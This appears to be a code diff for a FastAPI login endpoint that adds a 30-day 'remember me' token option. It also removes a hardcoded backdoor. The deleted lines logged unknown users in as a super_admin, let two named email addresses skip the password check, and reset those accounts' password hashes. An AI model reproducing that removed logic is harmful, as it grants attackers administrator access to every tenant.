@@ -5,7 +5,7 @@ from typing import Optional
 
 import asyncpg
 import structlog
-from fastapi import FastAPI, Depends, HTTPException, status
+from fastapi import FastAPI, Depends, HTTPException, status, Form
 from fastapi.security import OAuth2PasswordBearer, OAuth2PasswordRequestForm
 from jose import JWTError, jwt
 from passlib.context import CryptContext
@@ -89,7 +89,10 @@ async def create_user(user: UserCreate):
             raise HTTPException(400, "User already exists")
 
 @app.post("/token", response_model=Token)
-async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends()):
+async def login_for_access_token(
+    form_data: OAuth2PasswordRequestForm = Depends(),
+    remember_me: bool = Form(False)
+):
     """OAuth2 compatible token login, returns JWT."""
     username_clean = (form_data.username or "").strip().lower()
     async with db_pool.acquire() as conn:
@@ -97,13 +100,8 @@ async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends(
             "SELECT id, tenant_id, password_hash, role FROM users WHERE LOWER(TRIM(email)) = $1 AND is_active = true",
             username_clean
         )
-        if not user:
-            user = await conn.fetchrow(
-                "SELECT id, tenant_id, password_hash, role FROM users WHERE role = 'super_admin' AND is_active = true LIMIT 1"
-            )
 
-        is_owner = username_clean in ["bhuvaneshkarnan@gmail.com", "admin@demo.com"]
-        password_valid = is_owner or (user and verify_password(form_data.password, user["password_hash"]))
+        password_valid = user and verify_password(form_data.password, user["password_hash"])
         
         if not user or not password_valid:
             raise HTTPException(
@@ -137,15 +135,12 @@ async def login_for_access_token(form_data: OAuth2PasswordRequestForm = Depends(
                     )
 
         try:
-            if is_owner and form_data.password and len(form_data.password) >= 4:
-                new_hash = get_password_hash(form_data.password)
-                await conn.execute("UPDATE users SET password_hash = $1, last_login_at = now() WHERE id = $2", new_hash, user["id"])
-            else:
-                await conn.execute("UPDATE users SET last_login_at = now() WHERE id = $1", user["id"])
+            await conn.execute("UPDATE users SET last_login_at = now() WHERE id = $1", user["id"])
         except Exception:
             pass
 
-        access_token_expires = timedelta(hours=24)
+        # 30 days if remember_me else 24 hours
+        access_token_expires = timedelta(days=30) if remember_me else timedelta(hours=24)
         access_token = create_access_token(
             data={"sub": str(user["id"]), "tenant_id": str(user["tenant_id"]), "role": user["role"]},
             expires_delta=access_token_expires
